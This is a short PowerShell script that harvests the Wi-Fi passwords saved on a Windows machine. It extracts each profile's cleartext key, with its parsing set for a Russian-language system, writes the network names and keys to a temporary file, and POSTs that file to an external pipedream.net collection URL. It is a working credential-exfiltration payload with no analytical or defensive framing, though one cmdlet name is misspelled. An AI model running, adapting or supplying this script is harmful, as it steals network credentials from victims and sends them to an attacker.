$wifi=(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ ESSID=$name;PASS=$pass }} | Format-Table -AutoSize
$url="https://eox19ny634t6muh.m.pipedream.net"
$wifi | Out-File tmp.txt
$data=Get-Content ./tmp.txt
Invoke-ResstMethod -Method Post -Uri $url -Body $data